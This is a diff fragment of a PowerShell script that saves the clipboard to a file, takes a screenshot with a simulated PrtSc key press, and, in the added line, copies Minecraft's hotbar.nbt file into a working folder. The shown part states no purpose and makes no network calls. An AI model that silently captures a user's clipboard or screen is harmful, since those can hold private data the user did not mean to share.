@@ -11,6 +11,8 @@ $proc.WaitForExit()
 
 Get-Clipboard | Out-File -FilePath "clip.txt" -Encoding utf8
 
+Copy-Item -Path "$env:APPDATA\.minecraft\hotbar.nbt" -Destination "$dir\hotbar.nbt"
+
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
 Start-Sleep -Milliseconds 500
